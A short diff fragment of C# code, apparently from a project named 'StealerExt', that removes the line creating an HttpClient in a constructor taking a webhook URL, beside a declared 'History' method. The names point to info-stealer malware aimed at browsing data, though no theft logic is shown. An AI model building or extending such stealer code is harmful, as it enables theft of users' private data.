@@ -9,7 +9,6 @@ namespace StealerExt
 	{
 		public API(string _HookUrl)
 		{
-			_Client = new HttpClient();
 			_URL = _HookUrl;
 		}
         public static void History()
